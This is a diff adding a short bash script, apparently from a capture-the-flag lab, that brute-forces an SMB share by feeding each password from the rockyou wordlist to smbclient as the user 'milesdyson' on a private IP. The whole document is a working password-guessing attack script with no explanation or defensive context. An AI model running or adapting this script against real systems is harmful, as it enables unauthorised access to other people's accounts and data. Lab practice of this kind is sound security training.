@@ -1,0 +1,8 @@
+#!/bin/bash
+input="/usr/share/wordlists/rockyou.txt"
+user="milesdyson"
+while IFS= read -r line
+do
+  echo "$line"
+  smbclient //10.10.62.234/milesdyson -U "${user}%${line}" -p 445
+done < "$input"
